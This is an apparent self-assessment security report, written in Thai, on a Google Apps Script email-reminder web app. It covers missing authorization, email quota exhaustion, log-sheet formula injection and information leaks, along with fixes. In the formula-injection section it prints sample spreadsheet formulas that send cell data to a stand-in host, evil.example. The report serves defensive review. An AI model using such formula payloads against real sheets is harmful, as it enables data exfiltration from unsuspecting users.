# รายงานประเมินช่องโหว่ด้านความปลอดภัย (CIA Security Assessment)

**โปรเจกต์:** Email-notification- (ระบบแจ้งเตือนอีเมลจาก Google Sheet)
**ประเภทระบบ:** Google Apps Script Web App (`.gs` + `Sidebar.html`)
**วันที่ประเมิน:** 16 กรกฎาคม 2026
**ขอบเขต:** วิเคราะห์ช่องโหว่ที่ทำให้ attacker โจมตี **C**onfidentiality / **I**ntegrity /
**A**vailability ได้ พร้อม exploit scenario และคำแนะนำการแก้ไข
**สถานะ:** ประเมินเสร็จ + **แก้ไขโค้ดแล้ว** (ดูสรุปการแก้ไขในหัวข้อ 6) — V4 เป็นมาตรการเชิง ops

> ⚠️ เอกสารนี้จัดทำเพื่อการประเมินความปลอดภัยของระบบตนเอง (authorized self-assessment)
> exploit scenario ที่อธิบายมีไว้เพื่อความเข้าใจความเสี่ยงและการป้องกันเท่านั้น

---

## 1. บทสรุปผู้บริหาร (Executive Summary)

ระบบ deploy แบบ **Execute as: Me (เจ้าของ)** และเปิดสิทธิ์เข้าถึงได้กว้าง (README เปิดทางให้เลือก
"ทุกคนในองค์กร") โดย **ฟังก์ชันฝั่ง server ทุกตัวที่เรียกจาก client ไม่มีการตรวจสอบสิทธิ์
(authorization) เลยแม้แต่จุดเดียว** เมื่อรวมสองสิ่งนี้เข้าด้วยกัน ผู้ใช้ทุกคนในขอบเขต access
สามารถสั่งงานระบบด้วย **สิทธิ์ของเจ้าของ** ได้เต็มที่ — นี่คือรากของช่องโหว่ที่กระทบทั้ง C, I และ A

**ตารางสรุปช่องโหว่**

| # | ช่องโหว่ | ความรุนแรง | C | I | A | ตำแหน่ง |
|---|----------|:---------:|:-:|:-:|:-:|---------|
| V1 | ไม่มี authorization ฝั่ง server บน Web App endpoints | 🔴 Critical | ✔ | ✔ | ✔ | `Code.gs:38-70` |
| V2 | Gmail quota exhaustion / email DoS ผ่าน `sendTestEmail` | 🟠 High | | | ✔ | `EmailService.gs:257` |
| V3 | Spreadsheet formula (CSV) injection ลงชีต Log | 🟡 Medium | ✔ | ✔ | | `LogService.gs:9-23` |
| V4 | ตั้งค่าเก็บ plaintext ใน ScriptProperties เข้าถึงได้โดย editor ทุกคน | 🟡 Medium | ✔ | | | `SettingsService.gs:56-68` |
| V5 | Sheet ID access oracle จาก error message | 🟢 Low | ✔ | | | `SettingsService.gs:42-55` |
| V6 | OAuth consent ยังไม่ verify + scope ทำงานแทนเจ้าของ | 🟢 Low/Info | ✔ | ✔ | | `README.md` |
| V7 | Information disclosure ผ่าน error message ใน Log/อีเมล | 🟢 Low | ✔ | | | `Code.gs:25` |

---

## 2. รายละเอียดช่องโหว่

### V1 — [🔴 Critical] ไม่มี authorization ฝั่ง server บน Web App endpoints
**กระทบ: Confidentiality + Integrity + Availability**

**คำอธิบาย**
ตาม `README.md` Part D ระบบ deploy ด้วย **Execute as: `Me`** (โค้ดทำงานด้วยสิทธิ์เจ้าของ —
อ่าน Sheet และส่งอีเมลในนามเจ้าของ) และ **Who has access** เลือกได้ตั้งแต่ "เฉพาะตัวเอง" ไปจนถึง
"ทุกคนในองค์กร" ปัญหาคือ entry point ทั้งหมดใน `Code.gs` **ไม่มีการเช็คว่าใครเป็นผู้เรียก** —
ไม่มี `Session.getActiveUser().getEmail()` เทียบกับ allow-list ใด ๆ:

```
Code.gs:38  sendTestEmail()
Code.gs:46  getSettingsForSidebar()
Code.gs:57  saveSettingsFromSidebar(settings)
Code.gs:68  toggleReminderSystemFromSidebar(isEnabled)
```

ทุกฟังก์ชันเหล่านี้เรียกได้จาก client ผ่าน `google.script.run` (ดู `Sidebar.html:97-125`)
ผู้ที่อยู่ในขอบเขต access เพียงเปิด Web app URL ก็เรียกฟังก์ชันเหล่านี้ได้โดยตรง โดยไม่จำเป็นต้อง
ผ่าน UI ของ Sidebar

**Exploit scenario**
ผู้ใช้ที่อยู่ในขอบเขต access (เช่น พนักงานในองค์กร หากตั้ง "ทุกคนในองค์กร") เปิด Web app URL แล้ว
เรียก endpoint ตรง ๆ:

- **โจมตี Confidentiality:** `getSettingsForSidebar()` คืนค่า `toRecipients`, `ccRecipients`,
  `bccRecipients` (อีเมลภายในทั้งหมด), `sheetId` และ `logSheetId` → ได้รายชื่ออีเมลผู้เกี่ยวข้อง
  ทางการเงินและ ID ของไฟล์ Google Sheet ที่มีข้อมูลสัญญา/การจ่ายเงิน
- **โจมตี Integrity:** `saveSettingsFromSidebar({...})` เขียนทับการตั้งค่าได้ทั้งหมด — เปลี่ยน
  ผู้รับ (เพิ่ม/ลบ), ชี้ `sheetId`/`logSheetId` ไปไฟล์อื่น, แก้จำนวนวันแจ้งเตือน ทำให้การแจ้งเตือน
  เพี้ยนหรือส่งไปผิดคน
- **โจมตี Availability:** `toggleReminderSystemFromSidebar(false)` ปิดระบบและลบ trigger ทั้งหมด
  (ผ่าน `TriggerService.deleteExistingReminderTriggers()`) แบบเงียบ ๆ → องค์กรพลาดการแจ้งเตือน
  กำหนดจ่ายเงิน/รับเช็ค โดยไม่มีใครรู้ตัว

**ผลกระทบ:** เป็นช่องโหว่ที่รุนแรงที่สุด เพราะเปิดทางโจมตีได้ครบทั้งสามด้านของ CIA จากจุดเดียว

**คำแนะนำแก้ไข**
- เพิ่มการตรวจ authorization ที่ต้นทางของทุก entry point:
  `Session.getActiveUser().getEmail()` เทียบกับ allow-list ผู้ดูแลที่เก็บใน Script Properties
  แล้ว throw ถ้าไม่ผ่าน
- จำกัด "Who has access" ให้แคบที่สุดเท่าที่ธุรกิจยอมรับได้
- พิจารณาแยกฟังก์ชัน "อ่าน" ออกจาก "เขียน/สั่งการ" และคุมสิทธิ์คนละระดับ

---

### V2 — [🟠 High] Gmail quota exhaustion / email DoS ผ่าน `sendTestEmail`
**กระทบ: Availability**

**คำอธิบาย**
`sendTestEmail()` (`Code.gs:38` → `EmailService.gs:257`) ส่งอีเมลจริงด้วยบัญชีเจ้าของทุกครั้งที่ถูก
เรียก โดย **ไม่มี rate limit / cooldown** ใด ๆ บัญชี Gmail มีโควตาส่งอีเมลรายวันจำกัด
(ประมาณ 100 ฉบับ/วันสำหรับบัญชีทั่วไป, 1,500 ฉบับ/วันสำหรับ Google Workspace)

**Exploit scenario**
ผู้โจมตี (อาศัยช่องโหว่ V1 คือไม่มี authorization) วนเรียก `sendTestEmail()` ซ้ำ ๆ ในเวลาสั้น ๆ →
เผาโควตาการส่งอีเมลรายวันของบัญชีเจ้าของจนหมด ผลคือ:
- **A:** เมื่อ trigger จริง (`runScheduledReminder`) ทำงาน อีเมลแจ้งเตือนของจริงจะส่งไม่ออก
  (`MailApp` โยน quota error) → พลาดการแจ้งเตือนกำหนดจ่าย
- ผลข้างเคียง: ผู้รับที่ตั้งไว้ถูกสแปมด้วยอีเมล "ทดสอบ" จำนวนมาก

**คำแนะนำแก้ไข**
- เพิ่ม cooldown / rate limit ให้ `sendTestEmail` (เก็บ timestamp ล่าสุดใน PropertiesService และ
  ปฏิเสธหากเรียกถี่เกินกำหนด)
- ตรวจสอบโควตาคงเหลือด้วย `MailApp.getRemainingDailyQuota()` ก่อนส่ง
- บังคับ V1 (authorization) เพื่อจำกัดว่าใครกดทดสอบได้

---

### V3 — [🟡 Medium] Spreadsheet formula (CSV) injection ลงชีต Log
**กระทบ: Confidentiality + Integrity**

**คำอธิบาย**
`LogService.appendLog()` (`LogService.gs:9-23`) เขียนค่าลงชีต Log ด้วย `sheet.appendRow([...])`
โดยนำค่า `vendorName`, `recipient`, `errorMessage`, `no` ฯลฯ มาจากชีต DATA และอินพุตต่าง ๆ
**โดยไม่ sanitize** หากค่าเซลล์ขึ้นต้นด้วย `=`, `+`, `-`, หรือ `@` Google Sheets จะตีความเป็น
**สูตร (formula)** เมื่อเขียนลงชีต

หมายเหตุเชิงบวก: ฝั่งอีเมล HTML มีการ escape อยู่แล้ว (`EmailService.gs:194` `escapeHtml`) จึง
ปลอดภัยจาก XSS ในอีเมล — แต่ **การเขียนลงชีต Log ไม่ได้ผ่าน escape เดียวกันนี้**

**Exploit scenario**
ผู้ที่แก้ไขชีต DATA ได้ (หรือ vendor ที่ป้อนข้อมูลเข้าระบบต้นทาง) ตั้งค่า `Vendor name` เป็น เช่น
`=HYPERLINK("https://evil.example/?d="&CONCATENATE(A1:Z1),"click")` หรือ
`=IMPORTXML("https://evil.example/x","//a")` เมื่อระบบเขียนแถวนี้ลง Log และผู้ดูแล **เปิดชีต Log**
สูตรจะทำงานในบริบทของผู้ดูแล:
- **C:** สูตร `IMPORTXML`/`IMPORTDATA`/`HYPERLINK` สามารถดึงข้อมูลเซลล์อื่นออกไปยัง URL ภายนอก
  (exfiltration)
- **I:** สูตรบิดเบือน/ลบเนื้อหา Log ทำให้บันทึกการทำงานเชื่อถือไม่ได้

**คำแนะนำแก้ไข**
- Sanitize ทุกค่าก่อนเขียน Log: หากค่าขึ้นต้นด้วย `= + - @` (หรือ tab/CR) ให้ prefix ด้วย
  อัญประกาศเดี่ยว `'` หรือ escape เป็น text
- พิจารณาใช้ `Range.setValues()` พร้อมบังคับ number format เป็น plain text แทน `appendRow`

---

### V4 — [🟡 Medium] ตั้งค่าเก็บเป็น plaintext ใน ScriptProperties เข้าถึงได้โดย editor ทุกคน
**กระทบ: Confidentiality**

**คำอธิบาย**
`SettingsService.saveSettings()` (`SettingsService.gs:56-68`) เก็บอีเมลผู้รับทั้งหมด, `sheetId`,
`logSheetId` เป็น plaintext ใน Script Properties ใครก็ตามที่มีสิทธิ์ **แก้ไขโปรเจกต์ Apps Script**
(editor/collaborator ของ project) สามารถเปิดดู Project Settings → Script Properties แล้วเห็น
ค่าเหล่านี้ทั้งหมด

**Exploit scenario**
Collaborator ที่ควรมีสิทธิ์แค่แก้โค้ดบางส่วน กลับเห็นรายชื่ออีเมลภายในและ ID ไฟล์ Google Sheet
ที่มีข้อมูลการเงิน → นำ Sheet ID ไปขอสิทธิ์เข้าถึง/ใช้ประกอบการโจมตีอื่นได้

**คำแนะนำแก้ไข**
- จำกัดจำนวนผู้ที่มีสิทธิ์ editor บนโปรเจกต์ Apps Script ให้น้อยที่สุด (least privilege)
- ถือว่า Sheet ID เป็นข้อมูลกึ่งลับ — ควบคุมสิทธิ์ไฟล์ปลายทางให้รัดกุมแม้ ID จะรั่ว

---

### V5 — [🟢 Low] Sheet ID access oracle จาก error message
**กระทบ: Confidentiality**

**คำอธิบาย**
`saveSettings()` (`SettingsService.gs:42-55`) รับ `sheetId`/`logSheetId` จากผู้ใช้แล้วลอง
`SpreadsheetApp.openById(...).getName()` — ถ้าเปิดไม่ได้จะโยน error ข้อความเฉพาะ พฤติกรรมนี้ทำงาน
ด้วยสิทธิ์เจ้าของ (Execute as Me) จึงกลายเป็น **oracle** ที่บอกได้ว่า "บัญชีเจ้าของเข้าถึงไฟล์ ID
นี้ได้หรือไม่"

**Exploit scenario**
ผู้โจมตี (อาศัย V1) ป้อน Sheet ID ต่าง ๆ ผ่าน `saveSettingsFromSidebar` แล้วดูว่า error ต่างกัน
อย่างไร → ไล่ตรวจ (enumerate) ว่าเจ้าของมีสิทธิ์เข้าถึงไฟล์ใดบ้าง เป็นการรั่วข้อมูลทางอ้อม

**คำแนะนำแก้ไข**
- คืน error แบบ generic เหมือนกันไม่ว่าจะเป็นกรณี "ID ผิดรูปแบบ" หรือ "ไม่มีสิทธิ์เข้าถึง"
- บังคับ V1 เพื่อไม่ให้บุคคลนอกเรียกฟังก์ชันนี้ได้

---

### V6 — [🟢 Low/Info] OAuth consent ยังไม่ verify + scope ทำงานแทนเจ้าของ
**กระทบ: Confidentiality + Integrity (เชิงบริบท)**

**คำอธิบาย**
`README.md` แนะนำให้ผ่านหน้าจอเตือน "Google hasn't verified this app" ด้วยการกด
**Advanced → Go to (unsafe) → Allow** และระบบขอ scope `script.send_mail` (ส่งอีเมลแทนเจ้าของ)
การเคยชินกับการกดผ่านหน้าจอเตือนแบบนี้เพิ่มความเสี่ยงต่อ phishing/misuse และ scope ที่ทำงานแทน
เจ้าของทำให้ผลกระทบของ V1/V2 รุนแรงขึ้น

**คำแนะนำแก้ไข**
- ตั้ง OAuth consent screen เป็น **Internal** (ตามที่ README เสนอเป็นทางเลือกใน A2) เพื่อลด
  หน้าจอ unverified
- ทบทวน scope ให้เหลือเท่าที่จำเป็นจริง

---

### V7 — [🟢 Low] Information disclosure ผ่าน error message ใน Log/อีเมล
**กระทบ: Confidentiality**

**คำอธิบาย**
`runScheduledReminder` (`Code.gs:25`) ใส่ `error.message` ดิบลงในอีเมลแจ้งเตือนข้อผิดพลาด และ
`LogService.appendErrorLog` เก็บ `error.message` ลง Log ข้อความ error ภายในอาจเปิดเผยรายละเอียด
เชิงเทคนิค/โครงสร้างระบบต่อผู้รับหรือผู้เห็น Log

**คำแนะนำแก้ไข**
- แสดงข้อความ error แบบ generic ต่อผู้ใช้/ผู้รับ และเก็บรายละเอียดทางเทคนิคไว้ใน Log ที่ถูกจำกัด
  สิทธิ์และผ่านการ sanitize (V3)

---

## 3. จุดที่ทำได้ดีอยู่แล้ว (Positive findings)

เพื่อความสมดุลของการประเมิน ระบบมีมาตรการป้องกันที่ดีอยู่แล้วในหลายจุด:

- **ป้องกัน XSS ในอีเมล HTML:** `EmailService.escapeHtml()` (`EmailService.gs:194`) escape
  `& < > "` ให้ทุกค่าที่แสดงในตาราง HTML ของอีเมล
- **Allow-list โดเมนผู้รับ:** กรองให้ผู้รับต้องเป็น `@planbmedia.co.th` เท่านั้น
  (`EmailService.gs:279`) — ลดโอกาส exfiltrate ข้อมูลออกโดเมนภายนอกผ่านช่องผู้รับ
- **ตรวจรูปแบบวันที่อย่างเข้มงวด:** `DateService.parseSheetDate()` (`DateService.gs:10-26`)
  ตรวจ `DD/MM/YYYY` และ validate ค่าจริง กัน input แปลกปลอม
- **แยกชีต Log ออกจากชีต DATA:** ให้ DATA เป็น read-only ได้ (`LogService.gs:68-82`) เป็น
  แนวทางที่ดีเชิง least privilege

---

## 4. ตารางแมป CIA → ช่องโหว่ → Exploit → Remediation

| ด้าน CIA | ช่องโหว่หลัก | Exploit โดยย่อ | แนวทางแก้ไข |
|----------|--------------|----------------|-------------|
| **Confidentiality** | V1, V3, V4, V5, V7 | อ่านค่าตั้งค่า/อีเมล/Sheet ID; formula exfiltration ใน Log; อ่าน Script Properties; oracle; error leak | authorization ฝั่ง server; sanitize Log; จำกัดสิทธิ์ editor; error แบบ generic |
| **Integrity** | V1, V3 | เขียนทับการตั้งค่า; ฉีดสูตรบิดเบือน Log | authorization; sanitize ค่าก่อนเขียน Log |
| **Availability** | V1, V2 | ปิดระบบ/ลบ trigger; เผาโควตาอีเมลด้วย `sendTestEmail` | authorization; rate limit + ตรวจโควตาก่อนส่ง |

---

## 5. คำแนะนำการแก้ไขจัดลำดับความสำคัญ (ยังไม่ลงมือแก้)

1. **[สูงสุด] เพิ่ม authorization ฝั่ง server ทุก entry point** — เทียบ
   `Session.getActiveUser().getEmail()` กับ allow-list ผู้ดูแล และปฏิเสธหากไม่ผ่าน (แก้ V1, ลด
   ผลกระทบ V2/V5) พร้อมจำกัด "Who has access" ให้แคบที่สุด และพิจารณา "Execute as: User accessing"
2. **[สูง] เพิ่ม rate limit / cooldown ให้ `sendTestEmail`** และตรวจ
   `MailApp.getRemainingDailyQuota()` ก่อนส่ง (แก้ V2)
3. **[กลาง] Sanitize ค่าก่อนเขียนชีต Log** — prefix `'` หรือกันอักขระ `= + - @` (แก้ V3)
4. **[กลาง] จำกัดจำนวน editor ของโปรเจกต์ Apps Script** และถือ Sheet ID เป็นข้อมูลกึ่งลับ (แก้ V4)
5. **[ต่ำ] ทำ error message ให้ generic** ต่อผู้ใช้/ผู้รับ แต่เก็บรายละเอียดใน Log ที่ป้องกันแล้ว
   (แก้ V5, V7)
6. **[ต่ำ] ตั้ง OAuth consent เป็น Internal** และทบทวน scope ให้เหลือเท่าที่จำเป็น (แก้ V6)

---

---

## 6. สถานะการแก้ไข (Remediation status)

แก้ไขโค้ดตามคำแนะนำในหัวข้อ 5 แล้ว (อยู่ใน branch/PR เดียวกับรายงานฉบับนี้):

| # | สถานะ | สิ่งที่แก้ |
|---|-------|-----------|
| V1 | ✅ แก้แล้ว | เพิ่ม `AuthService.gs` (เจ้าของเข้าได้เสมอ + admin allow-list) และ guard ทุก interactive entry point ใน `Code.gs` (`doGet`, `getSettingsForSidebar`, `saveSettingsFromSidebar`, `sendTestEmail`, `toggleReminderSystemFromSidebar`) — `runScheduledReminder` (trigger) ไม่ถูก guard โดยตั้งใจ |
| V2 | ✅ แก้แล้ว | เพิ่ม cooldown `testEmailCooldownSeconds` (60 วิ) ใน `EmailService.sendTestEmail` และตรวจ `MailApp.getRemainingDailyQuota()` ใน `sendEmailWithRetry` |
| V3 | ✅ แก้แล้ว | เพิ่ม `LogService.sanitizeCell` prefix `'` ให้ค่าที่ขึ้นต้นด้วย `= + - @`/tab/CR ก่อน `appendRow` |
| V4 | 🛠 Ops note | เก็บ config ใน ScriptProperties เป็น plaintext เป็นข้อจำกัดของแพลตฟอร์ม — จำกัดจำนวน editor ของโปรเจกต์ Apps Script เป็นมาตรการเชิงปฏิบัติการ (ไม่มี code fix ที่ปลอดภัย) |
| V5 | ✅ แก้แล้ว | รวมข้อความ error ของ `sheetId`/`logSheetId` ใน `SettingsService.saveSettings` ให้ generic เหมือนกัน |
| V6 | ✅ แก้แล้ว | เพิ่ม `appsscript.json` ตั้ง `webapp.access: DOMAIN`, `executeAs: USER_DEPLOYING` (บัญชี consumer ที่ไม่มีโดเมนต้องปรับ `access` เองตอน deploy) |
| V7 | ✅ แก้แล้ว | อีเมลแจ้ง error ใน `runScheduledReminder` เปลี่ยนเป็นข้อความ generic ยังคง log รายละเอียดผ่าน `LogService.appendErrorLog` |

**การกำหนดผู้ดูแล (admin):** เจ้าของบัญชีที่ deploy เข้าถึงได้เสมอ ผู้ดูแลเพิ่มเติมกรอกได้ในช่อง
"Admin emails" บนหน้าตั้งค่า (หรือกำหนด Script Property `adminEmails` โดยตรง)

**ข้อจำกัดการทดสอบ:** โปรเจกต์ไม่มี test harness และโค้ด Google Apps Script รันได้เฉพาะบน
แพลตฟอร์ม Apps Script การตรวจสอบในรอบนี้เป็น static review + syntax/JSON validation +
unit reasoning ของ `sanitizeCell`/authorization เป็นหลัก แนะนำให้ทดสอบ end-to-end จริงหลัง
deploy (เข้าด้วยบัญชีนอก allow-list เพื่อยืนยันว่าถูกปฏิเสธ, กดทดสอบอีเมลถี่ ๆ เพื่อยืนยัน cooldown,
ใส่ค่า `=...` ในชีต DATA เพื่อยืนยันว่า Log ไม่รันสูตร)

---

*เอกสารนี้เป็นการประเมินเชิงวิเคราะห์จากการอ่านซอร์สโค้ด (static review) การยืนยันผลจริงควรทำใน
สภาพแวดล้อมทดสอบที่ได้รับอนุญาต*
